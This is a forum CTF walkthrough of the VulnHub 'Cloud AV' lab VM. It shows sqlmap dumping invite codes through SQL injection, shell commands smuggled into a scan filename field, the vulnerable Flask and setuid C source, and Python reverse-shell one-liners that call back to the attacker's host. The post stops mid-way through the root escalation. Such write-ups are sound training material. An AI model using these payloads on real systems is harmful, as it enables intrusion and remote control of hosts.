<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>(VulnHub)[BoredHackerBlog: Cloud AV] WriteUp — Walkthrough - CTF - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="VulnHub VM Box Link : https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/ 
Description: 

Cloud Anti-Virus Scanner! is a cloud-based antivirus scanning service.Currently, it’s in beta mode. You’ve been asked to t&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="20360.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;(VulnHub)[BoredHackerBlog: Cloud AV] WriteUp — Walkthrough&#39;" href="20360.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/3/32ca2e9f3205a31bde2aa9cf5d57c1f71a5ee601.png" />
<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/3/32ca2e9f3205a31bde2aa9cf5d57c1f71a5ee601.png" />
<meta property="og:url" content="https://0x00sec.org/t/vulnhub-boredhackerblog-cloud-av-writeup-walkthrough/20360" />
<meta name="twitter:url" content="https://0x00sec.org/t/vulnhub-boredhackerblog-cloud-av-writeup-walkthrough/20360" />
<meta property="og:title" content="(VulnHub)[BoredHackerBlog: Cloud AV] WriteUp — Walkthrough" />
<meta name="twitter:title" content="(VulnHub)[BoredHackerBlog: Cloud AV] WriteUp — Walkthrough" />
<meta property="og:description" content="VulnHub VM Box Link : https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/  Description:   Cloud Anti-Virus Scanner! is a cloud-based antivirus scanning service.Currently, it’s in beta mode. You’ve been asked to test the setup and find vulnerabilities and escalate privs.Difficulty: EasyTasks involved:  port scanning  webapp attacks  sql injection  command injection  brute forcing  code analysisVirtual Machine:Format: Virtual Machine (Virtualbox OVA)  Operating System: LinuxNetworking:  DH..." />
<meta name="twitter:description" content="VulnHub VM Box Link : https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/  Description:   Cloud Anti-Virus Scanner! is a cloud-based antivirus scanning service.Currently, it’s in beta mode. You’ve been asked to test the setup and find vulnerabilities and escalate privs.Difficulty: EasyTasks involved:  port scanning  webapp attacks  sql injection  command injection  brute forcing  code analysisVirtual Machine:Format: Virtual Machine (Virtualbox OVA)  Operating System: LinuxNetworking:  DH..." />
<meta property="og:article:section" content="CTF" />
<meta property="og:article:section:color" content="F1592A" />
<meta property="og:article:tag" content="ctf" />
<meta property="og:article:tag" content="writeup" />
<meta property="og:article:tag" content="hacking" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="4 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="6 ❤" />
<meta property="article:published_time" content="2020-04-08T16:32:08+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="20360.html">(VulnHub)[BoredHackerBlog: Cloud AV] WriteUp — Walkthrough</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/ctf/55.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #F1592A"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">CTF</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/ctf.html" class="discourse-tag" rel="tag">ctf</a>,
<a href="../../tag/writeup.html" class="discourse-tag" rel="tag">writeup</a>,
<a href="../../tag/hacking.html" class="discourse-tag" rel="tag">hacking</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="(VulnHub)[BoredHackerBlog: Cloud AV] WriteUp — Walkthrough">
<meta itemprop="articleSection" content="CTF">
<meta itemprop="keywords" content="ctf, writeup, hacking">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/DamaneDz"><span itemprop="name">DamaneDz</span></a>
(DamaneDz)
</span>
<link itemprop="mainEntityOfPage" href="20360.html">
<link itemprop="image" href="../../uploads/default/original/2X/3/32ca2e9f3205a31bde2aa9cf5d57c1f71a5ee601.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-04-08T16:32:08Z" class="post-time">
April 8, 2020, 4:32pm
</time>
<meta itemprop="dateModified" content="2020-07-06T17:40:33Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>VulnHub VM Box Link : <a href="https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/" rel="noopener nofollow ugc">https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/</a></p>
<p>Description:</p>
<blockquote>
<p>Cloud Anti-Virus Scanner! is a cloud-based antivirus scanning service.Currently, it’s in beta mode. You’ve been asked to test the setup and find vulnerabilities and escalate privs.Difficulty: EasyTasks involved:<br>
port scanning<br>
webapp attacks<br>
sql injection<br>
command injection<br>
brute forcing<br>
code analysisVirtual Machine:Format: Virtual Machine (Virtualbox OVA)<br>
Operating System: LinuxNetworking:<br>
DHCP Service: Enabled<br>
IP Address Automatically assignThis works better with VirtualBox than VMware</p>
</blockquote>
<p>Let’s run a NMAP Scan:</p>
<blockquote>
<p>nmap -sC -sV 192.168.9.101 --unprivileged<br>
Starting Nmap 7.80 ( <a href="https://nmap.org" rel="noopener nofollow ugc">https://nmap.org</a> ) at 2020-04-02 00:23 W. Central Africa Standard Time<br>
Strange read error from 192.168.9.101 (203 - ‘Unknown error’)<br>
Strange read error from 192.168.9.101 (203 - ‘Unknown error’)<br>
Strange read error from 192.168.9.101 (203 - ‘Unknown error’)<br>
Nmap scan report for 192.168.9.101<br>
Host is up (1.0s latency).<br>
Not shown: 995 closed ports<br>
PORT STATE SERVICE VERSION<br>
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>
| ssh-hostkey:<br>
| 2048 6a:42:4b:7c:2a:06:0f:50:4b:32:cf:b8:31:e9:c4:f4 (RSA)<br>
| 256 81:c7:60:0f:d7:1e:56:f7:a3:1e:9f:76:27:bd:31:27 (ECDSA)<br>
|_ 256 71:90:c3:26:ba:3b:e8:b3:53:7e:73:53:27:4d:6b:af (ED25519)<br>
2000/tcp filtered cisco-sccp<br>
8080/tcp open http Werkzeug httpd 0.14.1 (Python 2.7.15+)<br>
|_http-title: Site doesn’t have a title (text/html; charset=utf-8).<br>
32769/tcp filtered filenet-rpc<br>
50636/tcp filtered unknown<br>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/" rel="noopener nofollow ugc">https://nmap.org/submit/</a> .<br>
Nmap done: 1 IP address (1 host up) scanned in 269.47 seconds</p>
</blockquote>
<p>All BoredHackerBlog VM’s are based on attacks against Werkzeug httpd</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../uploads/default/original/2X/3/32ca2e9f3205a31bde2aa9cf5d57c1f71a5ee601.png" data-download-href="/uploads/short-url/7fj2Tyc6IXPlIEx0w41MULkkJ2h.png?dl=1" title><img src="../../uploads/default/original/2X/3/32ca2e9f3205a31bde2aa9cf5d57c1f71a5ee601.png" alt data-base62-sha1="7fj2Tyc6IXPlIEx0w41MULkkJ2h" width="690" height="429" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/32ca2e9f3205a31bde2aa9cf5d57c1f71a5ee601_2_10x10.png"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use xlink:href="#far-image"></use></svg><span class="filename"></span><span class="informations">862×537 21.6 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use xlink:href="#discourse-expand"></use></svg></div></a></div></p>
<p>So I had to intercept “ Invite Code “ request and sent via burpsuite intruder with special characters wordlist</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../uploads/default/original/2X/2/289596306891100e738eb5ea5c6dd180dafd63fd.png" data-download-href="/uploads/short-url/5N1AnDkDp8xL1HHJyF57WDpZ7tj.png?dl=1" title><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/2/289596306891100e738eb5ea5c6dd180dafd63fd_2_690x456.png" alt data-base62-sha1="5N1AnDkDp8xL1HHJyF57WDpZ7tj" width="690" height="456" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/2/289596306891100e738eb5ea5c6dd180dafd63fd_2_690x456.png, ../../uploads/default/original/2X/2/289596306891100e738eb5ea5c6dd180dafd63fd.png 1.5x, ../../uploads/default/original/2X/2/289596306891100e738eb5ea5c6dd180dafd63fd.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/289596306891100e738eb5ea5c6dd180dafd63fd_2_10x10.png"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use xlink:href="#far-image"></use></svg><span class="filename"></span><span class="informations">850×562 62.7 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use xlink:href="#discourse-expand"></use></svg></div></a></div></p>
<p>We had 2 bad characters “ and \</p>
<p>and the status was for both 500 and in the response raw we noticed some</p>
<p>flask message errors / console</p>
<p>and by trying manually to inject one of these we got the console:</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../uploads/default/original/2X/2/24197c9315e9c8dc025cc5f398a712ed47a02e57.png" data-download-href="/uploads/short-url/59lNdeJk97vhqrX2GpS4VV7xBdl.png?dl=1" title><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/2/24197c9315e9c8dc025cc5f398a712ed47a02e57_2_690x248.png" alt data-base62-sha1="59lNdeJk97vhqrX2GpS4VV7xBdl" width="690" height="248" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/2/24197c9315e9c8dc025cc5f398a712ed47a02e57_2_690x248.png, https://0x00sec.s3.amazonaws.com/optimized/2X/2/24197c9315e9c8dc025cc5f398a712ed47a02e57_2_1035x372.png 1.5x, ../../uploads/default/original/2X/2/24197c9315e9c8dc025cc5f398a712ed47a02e57.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/24197c9315e9c8dc025cc5f398a712ed47a02e57_2_10x10.png"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use xlink:href="#far-image"></use></svg><span class="filename"></span><span class="informations">1345×484 35 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use xlink:href="#discourse-expand"></use></svg></div></a></div></p>
<p>and we have no pin code for command execution so we had to look forward and this time with</p>
<p>SQLMap:</p>
<blockquote>
<p>sqlmap -r cloudantivirus_login -p password --risk 3 --level 5 --technique=“B” --dbms=SQLite --dump<br>
___<br>
<strong>H</strong><br>
___ <em><strong>[,]</strong></em>__ ___ ___ {1.4.3.12#dev}<br>
|_ -| . [(] | .’| . |<br>
|<em><em><em>|</em> [,]</em>|</em>|<em>|__,| <em>|<br>
|</em>|V… |</em>| <a href="http://sqlmap.org" rel="noopener nofollow ugc">http://sqlmap.org</a>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user’s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[<em>] starting @ 00:23:33 /2020-04-02/[00:23:33] [INFO] parsing HTTP request from ‘cloudantivirus_login’<br>
[00:23:34] [INFO] testing connection to the target URL<br>
[00:23:34] [INFO] checking if the target is protected by some kind of WAF/IPS<br>
[00:23:34] [INFO] testing if the target URL content is stable<br>
[00:23:34] [INFO] target URL content is stable<br>
[00:23:35] [WARNING] heuristic (basic) test shows that POST parameter ‘password’ might not be injectable<br>
[00:23:35] [INFO] testing for SQL injection on POST parameter ‘password’<br>
[00:23:35] [INFO] testing ‘AND boolean-based blind - WHERE or HAVING clause’<br>
[00:23:36] [INFO] testing ‘OR boolean-based blind - WHERE or HAVING clause’<br>
got a refresh intent (redirect like response common to login pages) to ‘/scan’. Do you want to apply it from now on? [Y/n] y<br>
[00:23:41] [INFO] testing ‘OR boolean-based blind - WHERE or HAVING clause (NOT)’<br>
[00:23:41] [INFO] POST parameter ‘password’ appears to be ‘OR boolean-based blind - WHERE or HAVING clause (NOT)’ injectable<br>
[00:23:41] [WARNING] in OR boolean-based injection cases, please consider usage of switch ‘–drop-set-cookie’ if you experience any problems during data retrieval<br>
[00:23:41] [INFO] checking if the injection point on POST parameter ‘password’ is a false positive<br>
POST parameter ‘password’ is vulnerable. Do you want to keep testing the others (if any)? [y/N] n<br>
sqlmap identified the following injection point(s) with a total of 259 HTTP(s) requests:<br>
Parameter: password (POST)<br>
Type: boolean-based blind<br>
Title: OR boolean-based blind - WHERE or HAVING clause (NOT)<br>
Payload: password=1" OR NOT 4631=4631-- EoHY<br>
[00:23:43] [INFO] testing SQLite<br>
[00:23:43] [INFO] confirming SQLite<br>
[00:23:43] [INFO] actively fingerprinting SQLite<br>
[00:23:43] [INFO] the back-end DBMS is SQLite<br>
back-end DBMS: SQLite<br>
[00:23:43] [INFO] fetching tables for database: ‘SQLite_masterdb’<br>
[00:23:43] [INFO] fetching number of tables for database ‘SQLite_masterdb’<br>
[00:23:44] [WARNING] running in a single-thread mode. Please consider usage of option ‘–threads’ for faster data retrieval<br>
[00:23:44] [INFO] retrieved: 1<br>
[00:23:44] [INFO] retrieved: code<br>
[00:23:44] [INFO] retrieved: CREATE TABLE <code>code</code> ( <code>password</code> TEXT )<br>
[00:23:47] [INFO] fetching entries for table ‘code’ in database ‘SQLite_masterdb’<br>
[00:23:47] [INFO] fetching number of entries for table ‘code’ in database ‘SQLite_masterdb’<br>
[00:23:47] [INFO] retrieved: 4<br>
[00:23:48] [INFO] retrieved: myinvitecode123<br>
[00:23:49] [INFO] retrieved: mysecondinvitecode<br>
[00:23:50] [INFO] retrieved: cloudavtech<br>
[00:23:51] [INFO] retrieved: mostsecurescanner<br>
Database: SQLite_masterdb<br>
Table: code<br>
[4 entries]<br>
±-------------------+<br>
| password |<br>
±-------------------+<br>
| myinvitecode123 |<br>
| mysecondinvitecode |<br>
| cloudavtech |<br>
| mostsecurescanner |<br>
±-------------------+[00:23:52] [INFO] table ‘SQLite_masterdb.code’ dumped to CSV file ‘C:\Users\ADMIN\AppData\Local\sqlmap\output\192.168.9.101\dump\SQLite_masterdb\code.csv’<br>
[00:23:52] [WARNING] HTTP error codes detected during run:<br>
500 (Internal Server Error) - 60 times<br>
[00:23:52] [INFO] fetched data logged to text files under ‘C:\Users\ADMIN\AppData\Local\sqlmap\output\192.168.9.101’[</em>] ending @ 00:23:52 /2020-04-02/</p>
</blockquote>
<p>We have 4 invite codes !</p>
<blockquote>
<p>myinvitecode123<br>
mysecondinvitecode<br>
cloudavtech<br>
mostsecurescanner</p>
</blockquote>
<p>By trying one of these we are redirected to /scan</p>
<p><img src="../../uploads/default/original/2X/0/08dc5aa49ae227f795ac934d061dd71872024c3f.png" alt data-base62-sha1="1gnVqh3fOefOvB1qMCcCdO7Tayz" width="629" height="461"></p>
<p>and we have a list of command that we can scan !</p>
<p>Scan with what ? … let’s try to scan the “hello” file …</p>
<p>and after 1m12s as shown below we had some kind of a virus scan</p>
<p><img src="../../uploads/default/original/2X/a/a23a02af440506ff443d0eea8130e1377d9cee4b.png" alt data-base62-sha1="n97Dv2zZ6nwmEaWeI1nfR3zMRe3" width="444" height="315"></p>
<p>and no scanned files :0</p>
<p>Our Next step must be clever !</p>
<p>via BurpSuite we sent this :</p>
<blockquote>
<p>POST /output HTTP/1.1<br>
Host: 192.168.9.101:8080<br>
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0<br>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>
Accept-Language: en-US,en;q=0.5<br>
Content-Type: application/x-www-form-urlencoded<br>
Content-Length: 26<br>
Referer: <a href="http://192.168.9.101:8080/scan" rel="noopener nofollow ugc">http://192.168.9.101:8080/scan</a><br>
Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.XoUw-A.i_sGFVAedfesEhev1zBmKhEuAPQ<br>
DNT: 1<br>
Connection: close<br>
Upgrade-Insecure-Requests: 1</p>
<p>filename=python+%7C+ls±la</p>
</blockquote>
<p>The response was:</p>
<blockquote>
<p>HTTP/1.0 200 OK<br>
Content-Type: text/html; charset=utf-8<br>
Content-Length: 345<br>
Vary: Cookie<br>
Server: Werkzeug/0.14.1 Python/2.7.15+<br>
Date: Thu, 02 Apr 2020 00:27:26 GMT</p>
<pre>total 24<br>
drwxrwxr-x 4 scanner scanner 4096 Oct 24  2018 .<br>
drwxr-xr-x 6 scanner scanner 4096 Oct 24  2018 …<br>
-rw-rw-r-- 1 scanner scanner 1550 Oct 24  2018 app.py<br>
-rw-r–r-- 1 scanner scanner 2048 Oct 21  2018 database.sql<br>
drwxrwxr-x 2 scanner scanner 4096 Oct 21  2018 samples<br>
drwxrwxr-x 2 scanner scanner 4096 Oct 21  2018 templates<br>
</pre>
</blockquote>
<p>let’s run 2 commands to read the app.py file and get the full path:</p>
<blockquote>
<p>python | cat app.py | pwd</p>
</blockquote>
<p>The response raw:</p>
<blockquote>
<p>HTTP/1.0 200 OK<br>
Content-Type: text/html; charset=utf-8<br>
Content-Length: 37<br>
Vary: Cookie<br>
Server: Werkzeug/0.14.1 Python/2.7.15+<br>
Date: Thu, 02 Apr 2020 00:30:27 GMT</p>
<pre>/home/scanner/cloudav_app<br>
</pre>
</blockquote>
<p>I wasn’t able to read the python file !</p>
<p>so from the begging I had to to that …</p>
<blockquote>
<p>filename=cat;cat /home/scanner/cloudav_app/app.py</p>
</blockquote>
<p>The response raw:</p>
<blockquote>
<p>HTTP/1.0 200 OK<br>
Content-Type: text/html; charset=utf-8<br>
Content-Length: 1788<br>
Vary: Cookie<br>
Server: Werkzeug/0.14.1 Python/2.7.15+<br>
Date: Thu, 02 Apr 2020 00:39:26 GMT</p>
<pre><br>
----------- SCAN SUMMARY -----------<br>
Known viruses: 2095534<br>
Engine version: 0.102.2<br>
Scanned directories: 0<br>
Scanned files: 0<br>
Infected files: 0<br>
Data scanned: 0.00 MB<br>
Data read: 0.00 MB (ratio 0.00:1)<br>
Time: 30.149 sec (0 m 30 s)<br>
from flask import Flask, render_template, request, session<br>
import sqlite3<br>
import subprocess<br>
import osconn = sqlite3.connect(‘database.sql’,check_same_thread = False)<br>
c = conn.cursor()app = Flask(<strong>name</strong>)<span class="mention">@app.route</span>(’/’)<br>
def index():<br>
return render_template(‘index.html’)<span class="mention">@app.route</span>(’/login’, methods=[‘POST’])<br>
def login():<br>
password = request.form[‘password’]<br>
if len(c.execute(‘select * from code where password="’ + password + ‘"’).fetchall()) &gt; 0:<br>
session[‘logged_in’] = True<br>
return ‘Redirecting to /scan. ’<br>
else:<br>
return “WRONG INFORMATION”<span class="mention">@app.route</span>(’/scan’)<br>
def shop():<br>
if session.get(‘logged_in’):<br>
filelist = subprocess.Popen(“ls -l /home/scanner/cloudav_app/samples”, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.read()<br>
return render_template(‘scan.html’,filelist=filelist)<br>
else:<br>
return ‘’<span class="mention">@app.route</span>(’/output’, methods=[‘POST’])<br>
def output():<br>
if session.get(‘logged_in’):<br>
filename = request.form[‘filename’]<br>
scan_results = subprocess.Popen("clamscan "+filename, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.read()<br>
return “<pre>” + scan_results + “</pre>”<br>
else:<br>
return ''if <strong>name</strong> == “<strong>main</strong>”:<br>
app.secret_key = os.urandom(12)<br>
app.run(host=‘0.0.0.0’,port=8080, debug=True)<br>
</pre>
</blockquote>
<p>and for a reverse shell we only have to send this</p>
<blockquote>
<p>cat;python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.9.1”,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);’</p>
</blockquote>
<p><img src="../../uploads/default/original/2X/1/13769fc42f704c7d2731e1994a99bafffd5a85c2.png" alt data-base62-sha1="2MbdOIYQRjBhg1OT1Yv6UfU2SCC" width="617" height="161"></p>
<p>let’s run the Linux enumeration script “linpeas.sh”</p>
<p>Some notes from linpeas:</p>
<blockquote>
<p>[+] Users with console<br>
cloudav:x:1000:1000:cloudav:/home/cloudav:/bin/bash<br>
root:x:0:0:root:/root:/bin/bash<br>
scanner:x:1001:1001:scanner,:/home/scanner:/bin/bash[+] All users &amp; groups<br>
uid=0(root) gid=0(root) groups=0(root)<br>
uid=1000(cloudav) gid=1000(cloudav) groups=1000(cloudav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)<br>
uid=1001(scanner) gid=1001(scanner) groups=1001(scanner)[+] Looking for root files in home dirs (limit 20)<br>
/home<br>
/home/scanner/update_cloudav</p>
</blockquote>
<p>and by going to /home/scanner</p>
<blockquote>
<p>scanner@cloudav:~/cloudav_app$ cd /home/<br>
cd /home/<br>
scanner@cloudav:/home$ ls -la<br>
ls -la<br>
total 16<br>
drwxr-xr-x 4 root root 4096 Oct 21 2018 .<br>
drwxr-xr-x 23 root root 4096 Apr 1 21:08 …<br>
drwxr-xr-x 4 cloudav cloudav 4096 Oct 24 2018 cloudav<br>
drwxr-xr-x 6 scanner scanner 4096 Oct 24 2018 scanner<br>
scanner@cloudav:/home$ cd scanner<br>
cd scanner<br>
scanner@cloudav:~$ ls -la<br>
ls -la<br>
total 60<br>
drwxr-xr-x 6 scanner scanner 4096 Oct 24 2018 .<br>
drwxr-xr-x 4 root root 4096 Oct 21 2018 …<br>
-rw------- 1 scanner scanner 5 Oct 24 2018 .bash_history<br>
-rw-r–r-- 1 scanner scanner 220 Oct 21 2018 .bash_logout<br>
-rw-r–r-- 1 scanner scanner 3771 Oct 21 2018 .bashrc<br>
drwx------ 2 scanner scanner 4096 Oct 21 2018 .cache<br>
drwxrwxr-x 4 scanner scanner 4096 Oct 24 2018 cloudav_app<br>
drwx------ 3 scanner scanner 4096 Apr 2 00:50 .gnupg<br>
drwxrwxr-x 3 scanner scanner 4096 Oct 21 2018 .local<br>
-rw-r–r-- 1 scanner scanner 807 Oct 21 2018 .profile<br>
-rw-rw-r-- 1 scanner scanner 66 Oct 21 2018 .selected_editor<br>
-rwsr-xr-x 1 root scanner 8576 Oct 24 2018 update_cloudav<br>
-rw-rw-r-- 1 scanner scanner 393 Oct 24 2018 update_cloudav.c<br>
scanner@cloudav:~$ cat update_cloudav.c<br>
cat update_cloudav.c<br>
<span class="hashtag">#include</span> &lt;stdio.h&gt;int main(int argc, char *argv[])<br>
{<br>
char *freshclam="/usr/bin/freshclam";if (argc &lt; 2){<br>
printf(“This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n”);<br>
return 1;<br>
}char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);<br>
sprintf(command, “%s %s”, freshclam, argv[1]);<br>
setgid(0);<br>
setuid(0);<br>
system(command);<br>
return 0;}<br>
scanner@cloudav:~$ update_cloudav x;id<br>
update_cloudav x;id<br>
update_cloudav: command not found<br>
uid=1001(scanner) gid=1001(scanner) groups=1001(scanner)<br>
scanner@cloudav:~$ ./update_cloudav x;id<br>
./update_cloudav x;id<br>
ERROR: Problem with internal logger (UpdateLogFile = /var/log/clamav/freshclam.log).<br>
ERROR: initialize: libfreshclam init failed.<br>
ERROR: Initialization error!<br>
ERROR: /var/log/clamav/freshclam.log is locked by another process<br>
uid=1001(scanner) gid=1001(scanner) groups=1001(scanner)</p>
</blockquote>
<p>we have a vulnerably binary as it show in the C source code</p>
<blockquote>
<p><span class="hashtag">#include</span> &lt;stdio.h&gt;int main(int argc, char *argv[])<br>
{<br>
char *freshclam="/usr/bin/freshclam";if (argc &lt; 2){<br>
printf(“This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n”);<br>
return 1;<br>
}char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);<br>
sprintf(command, “%s %s”, freshclam, argv[1]);<br>
setgid(0);<br>
setuid(0);<br>
system(command);<br>
return 0;}</p>
</blockquote>
<p>We have some group id and user id set to 0 which means to root !</p>
<p>let’s try to play with it and get our root privileges …</p>
<p>First of all I created another python reverse shell in a sh file and I named it x.sh</p>
<blockquote>
<p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.9.1”,5656));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);’</p>
</blockquote>
<p>Let’s upload it to the current directory /home/scanner/</p>
